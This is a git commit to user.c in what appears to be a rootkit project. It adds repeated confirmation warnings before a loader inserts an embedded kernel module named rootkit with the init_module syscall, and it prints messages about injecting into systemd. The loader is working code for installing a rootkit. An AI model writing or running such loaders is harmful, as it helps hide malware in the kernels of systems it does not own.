5cb1cf8081163b483f11b3ce2bd8ed3746e73e8f
Chisheng Chen <johnny1001s000602@gmail.com>
2025-05-17 20:10:48 +0800

    Add some info message
    Since it has the potential to cause some irreversible damage to the
    system, this ensures user know what they are doing.

--- user.c
+++ user.c
@@ -2,16 +2,29 @@
 #include <stdio.h>
 #include <syscall.h>
 #include <unistd.h>
+#include "common.h"
 
 extern const char _binary_rootkit_ko_start[];
 extern const char _binary_rootkit_ko_end[];
 
 int main()
 {
+    char yes;
+    for (int i = 0; i < 3; i++) {
+        puts(WARN
+             "THIS WILL POTENTIALLY CAUSE IRREVERSIBLE DAMAGE TO THE SYSTEM");
+        printf("Do you still want to do it? [y/n]: ");
+        scanf(" %c", &yes);
+        if (yes != 'y' && yes != 'Y')
+            return 0;
+    }
+    puts(INFO "Start injecting module into systemd...");
+
+    puts(INFO "Start loading kernel module...");
     if (syscall(SYS_init_module, _binary_rootkit_ko_start,
                 _binary_rootkit_ko_end - _binary_rootkit_ko_start,
                 (char[]){'\0'})) {
-        puts("[!] You are not root");
+        puts(WARN "You are not root");
         return -1;
     }
     return 0;
